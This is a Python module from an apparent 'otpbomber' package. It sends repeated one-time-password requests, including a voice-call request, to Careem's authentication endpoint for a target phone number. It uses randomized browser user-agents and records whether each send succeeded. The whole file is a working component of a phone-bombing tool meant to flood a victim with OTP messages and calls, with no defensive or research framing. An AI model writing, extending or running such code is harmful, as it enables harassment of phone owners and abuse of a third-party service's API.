from otpbomber.core import *
from otpbomber.localuseragent import *
import asyncio

async def careem_voice(phone, client, out):
    name = 'careem_voice'
    domain = 'careem.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json'}
    try:
        await client.post('https://www.careem.com/api/auth/send_otp', headers=headers, json={'mobile': f'92{phone[-10:]}'})
        await asyncio.sleep(1)
        response = await client.post('https://www.careem.com/api/auth/send_otp', headers=headers, json={'mobile': f'92{phone[-10:]}', 'method': 'call'})
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})